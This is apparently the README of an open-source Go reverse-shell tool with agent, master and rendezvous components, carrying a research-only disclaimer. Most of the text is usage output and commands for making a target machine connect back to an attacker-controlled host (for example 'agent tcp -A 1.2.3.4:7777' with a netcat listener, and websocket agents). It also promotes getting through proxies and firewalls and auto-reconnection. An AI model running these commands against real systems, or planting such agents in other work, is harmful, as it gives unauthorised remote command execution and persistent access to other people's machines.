## A simple reverse-shell written in Go

[![Build Status](https://travis-ci.org/maxlaverse/reverse-shell.svg?branch=master)](https://travis-ci.org/maxlaverse/reverse-shell)

**Disclaimer: This project is for research purposes only, and should only be used on authorized systems.**

---

## Introduction
"A reverse shell is a type of shell in which the target machine communicates back to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved." ([source](http://resources.infosecinstitute.com/icmp-reverse-shell/))

A reverse shell is also really useful when you're playing with your SSH server and want to have a backup plan
in case of misconfiguration.

Of course the simplest and most portable way is to use [Netcat](http://nc110.sourceforge.net/).

Here is a some features of this Go implementation:
* good portability
* can cross most proxies and firewalls with default configuration (using websockets, on https, on standard ports)
* auto-reconnection
* supports having multiple shells running on a single agent

This projects contains 3 applications that help you setting and interacting with remote shells:
* an `agent` to be started on the server where you want to open a shell
* a `master` waiting for agent connections and that allow you to interact with the shells
* a `rendezvous` application providing a central point where agents and masters meet when a direct connection is not possible/wanted (not mandatory)

## Installation
Download the binaries
```bash
curl -O -L -s /dev/null https://github.com/maxlaverse/reverse-shell/releases/download/v0.0.1/reverse-shell-0.0.1-linux-amd64.tar.gz | tar xvz
```

Or build from source
```bash
$ git clone https://github.com/maxlaverse/reverse-shell
$ cd reverse-shell && make
```

## Agent
```bash
Starts an agent listening for remote commands. The Agent can receive remote commands is various ways.

Usage:
  reverse-shell-agent [command]

Available Commands:
  help        Help about any command
  stdin       Agent that listens for command on stdin
  tcp         Agent that connects to a remove tcp endpoints and listen for commands
  tcpdirect   Agent that listens for commands on a local port
  websocket   Agent that connects to a websocket endpoints and wait for commands

Flags:
  -h, --help          help for reverse-shell-agent
  -v, --verbose int   Be verbose on log output

Use "reverse-shell-agent [command] --help" for more information about a command.
```

### stdin
Absolutely useless. It's basically just piping *stdin* to a process on the same machine.
```bash
Usage:
  agent [OPTIONS] stdin
```

### tcp
Connect to a remote host and execute every command received from it.
```bash
Usage:
  agent [OPTIONS] tcp [tcp-OPTIONS]

[tcp command options]
      -A, --address= Address [$ADDRESS]
```

Use the `listen` master command on a remote host to wait for connection:
```bash
# On the master (1.2.3.4)
$ nc -v -l -p 7777

# On the target
$ agent tcp -A 1.2.3.4:7777
```

### tcpdirect
Listen to a tcp port and execute every command received by a master.
```bash
Usage:
  agent [OPTIONS] tcpdirect [tcp-OPTIONS]

  [tcpdirect command options]
        -P, --port= Port [$PORT]
```

You can connect to it using netcat:
```bash
# On the agent (1.2.3.4)
$ agent tcpdirect -P 7777

# On the master
$ nc 1.2.3.4 7777
```

### websocket
Connect to a remote websocket and execute every command received.
The remote host can be a `master` or a `rendezvous`.
```bash
Usage:
  agent [OPTIONS] websocket [websocket-OPTIONS]

[websocket command options]
      -U, --url=  Url of the rendez-vous point. [$URL]
```

```bash
# On the master (1.2.3.4)
$ master listen -P 7777

# On the agent
$ agent websocket -U http://1.2.3.4:7777
```

Once an agent connects, you will be able to write commands in *stdin* that will be directly executed on the agent. You can also connect to a `rendezvous` point instead of a master.

You can also connect to the outside using a proxy:
```bash
$ http_proxy=http://your-proxy:3128 https_proxy=http://your-proxy:3128 agent websocket -U http://1.2.3.4:7777
```

## Rendez-vous
The `rendezvous` is an http server listening for `agents` and `masters`.
It can run behind a reverse-proxy and that reverse-proxy could to SSL offloading.

```bash
Usage:
  rendezvous [OPTIONS]

Application Options:
  -P, --port= Port [$PORT]
```

Start the `rendezvous` and the `agent`:
```bash
# On the rendezvous (1.2.3.4)
$ rendezvous -P 7777

# On the agent (3.4.5.6)
$ agent websocket -U http://1.2.3.4:7777
```

Open a shell and send some commands
```bash
# List the agents
$ ./master list-agents -U http://1.2.3.4:7777
List of agents:
* 3.4.5.6:65000

# Create a session
$ master create -U http://1.2.3.4:7777 3.4.5.6:65000
Attaching to admiring_meitn
Connected to admiring_meitn
bash-3.2$
```

# Master
```bash
Usage:
  master [OPTIONS] <command>

Help Options:
  -h, --help  Show this help message

Available commands:
  attach         attach to an existing session
  create         create a new session on a given agent
  list-agents    list all the agents available on a rendez-vous
  list-sessions  list all the sessions available on a rendez-vous
  listen         listen for agents to connect using websocket
```

## Todo
* add scp-like commands
* improve logging messages
* read variables from environment
* have agent send its IP  and rendez vous showing the proxy client one
